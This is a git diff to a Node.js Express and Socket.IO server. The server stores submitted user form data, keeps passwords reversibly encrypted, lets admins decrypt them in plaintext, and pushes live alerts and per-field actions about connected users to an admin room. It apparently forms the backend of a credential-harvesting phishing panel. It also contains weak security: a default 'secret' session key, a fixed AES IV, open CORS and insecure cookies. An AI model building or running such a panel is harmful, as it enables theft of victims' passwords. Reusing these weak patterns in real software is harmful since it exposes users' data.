@@ -5,18 +5,21 @@ const helmet = require('helmet');
 const cors = require('cors');
 const cookieParser = require('cookie-parser');
 const session = require('express-session');
+const SQLiteStore = require('connect-sqlite3')(session);
 const { Server } = require('socket.io');
 const db = require('./db');
 const crypto = require('crypto');
 const { v4: uuidv4 } = require('uuid');
 require('dotenv').config();
 
+// AES keys
 const AES_KEY = process.env.AES_KEY_BASE64 ? Buffer.from(process.env.AES_KEY_BASE64, 'base64') : Buffer.alloc(0);
 const AES_IV = process.env.AES_IV_BASE64 ? Buffer.from(process.env.AES_IV_BASE64, 'base64') : Buffer.alloc(0);
 if (AES_KEY.length !== 32 || AES_IV.length !== 16) {
   console.warn('Warning: AES key or IV not set correctly. See .env.example');
 }
 
+// Encrypt / Decrypt
 function encrypt(text){
   if(!text) return null;
   const cipher = crypto.createCipheriv('aes-256-cbc', AES_KEY, AES_IV);
@@ -31,32 +34,30 @@ function decrypt(b64){
   return decrypted.toString('utf8');
 }
 
+// App & server
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: '*' } });
 
+// Middleware
 app.use(helmet());
 app.use(cors());
 app.use(express.json({ limit: '2mb' }));
 app.use(express.urlencoded({ extended: true }));
 app.use(cookieParser());
 app.use(session({
+  store: new SQLiteStore({ db: 'sessions.sqlite', dir: './db' }), // sessions en SQLite
   secret: process.env.SESSION_SECRET || 'secret',
   resave: false,
   saveUninitialized: false,
   cookie: { secure: false }
 }));
 
-// Serve admin static files
+// Serve static files
 app.use('/admin/static', express.static(path.join(__dirname, 'public', 'admin')));
 app.use('/sounds', express.static(path.join(__dirname, 'public', 'sounds')));
 
-// **Redirigir la raíz al panel admin**
-app.get('/', (req, res) => {
-  res.redirect('/admin');
-});
-
-// Simple admin auth (session-based)
+// Admin login/logout
 app.post('/admin/login', (req, res) => {
   const { user, pass } = req.body;
   if (user === process.env.ADMIN_USER && pass === process.env.ADMIN_PASS) {
@@ -73,7 +74,7 @@ function requireAdmin(req, res, next){
   return res.status(401).json({ ok: false, msg: 'unauthorized' });
 }
 
-// API to save incoming user form data
+// API to save form data
 app.post('/api/save', (req, res) => {
   const body = req.body || {};
   const clientId = body.clientId || uuidv4();
@@ -104,7 +105,6 @@ app.get('/admin/records', requireAdmin, (req, res) => {
   const all = db.getAllUsers();
   res.json(all.map(r => ({ ...r, password_enc: r.password_enc })));
 });
-
 app.post('/admin/action', requireAdmin, (req, res) => {
   const { clientId, field, action } = req.body;
   if (!clientId || !action) return res.status(400).json({ ok: false });
@@ -114,7 +114,6 @@ app.post('/admin/action', requireAdmin, (req, res) => {
   io.to('admins').emit('user_updated', db.getUserByClientId(clientId));
   res.json({ ok: true });
 });
-
 app.get('/admin/decrypt/:clientId', requireAdmin, (req, res) => {
   const clientId = req.params.clientId;
   const user = db.getUserByClientId(clientId);
@@ -123,12 +122,12 @@ app.get('/admin/decrypt/:clientId', requireAdmin, (req, res) => {
   res.json({ ok: true, password: decrypted });
 });
 
-// Simple admin UI entry
+// Admin UI
 app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
 });
 
-// Socket.IO connection handling
+// Socket.IO
 io.on('connection', (socket) => {
   socket.on('register_admin', () => {
     socket.join('admins');
@@ -142,9 +141,9 @@ io.on('connection', (socket) => {
     socket.emit('registered', { clientId, user });
     io.to('admins').emit('new_user_connected', { clientId, usuario: user.usuario });
   });
-
   socket.on('disconnect', () => {});
 });
 
+// Start server
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log('Server running on port', PORT));
